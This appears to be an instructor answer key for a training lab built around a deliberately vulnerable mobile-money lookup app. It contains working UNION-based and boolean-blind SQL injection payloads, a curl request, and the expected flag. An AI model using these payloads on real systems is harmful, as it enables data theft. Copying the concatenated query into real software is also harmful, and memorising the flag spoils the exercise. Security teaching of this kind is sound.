# PesaLink SQL Injection Lab

This is the instructor reference for the intentionally vulnerable PesaLink mobile money target. Do not publish this file to students.

## Build and Run

```bash
docker build -t ghana-cybersim/sqli-momo:latest labs/sqli-momo
docker run --rm -p 8000:8000 ghana-cybersim/sqli-momo:latest
```

Open `http://localhost:8000` and use the transaction lookup form.

## Intended Vulnerability

The vulnerable endpoint is:

```text
GET /api/lookup?phone=<input>
GET /lookup?phone=<input>
```

`app.py` concatenates the `phone` parameter directly into a SQLite query. That is intentional for this lab only.

## Working UNION Payload

Submit this value as the phone number:

```sql
' UNION SELECT 999, 'FLAG', '0000000000', flag, 0, 'SETTLED', datetime('now') FROM admin_secrets-- 
```

URL-encoded for curl:

```bash
curl "http://localhost:8000/api/lookup?phone=%27%20UNION%20SELECT%20999%2C%20%27FLAG%27%2C%20%270000000000%27%2C%20flag%2C%200%2C%20%27SETTLED%27%2C%20datetime%28%27now%27%29%20FROM%20admin_secrets--%20"
```

Expected flag:

```text
CYBERSIM{sql1_1nj3ct10n_m4st3r_2026}
```

## Boolean-Based Blind Check

True condition:

```sql
' OR (SELECT substr(flag,1,1) FROM admin_secrets)='C'-- 
```

False condition:

```sql
' OR (SELECT substr(flag,1,1) FROM admin_secrets)='X'-- 
```

The true condition returns normal transaction rows; the false condition returns zero rows.
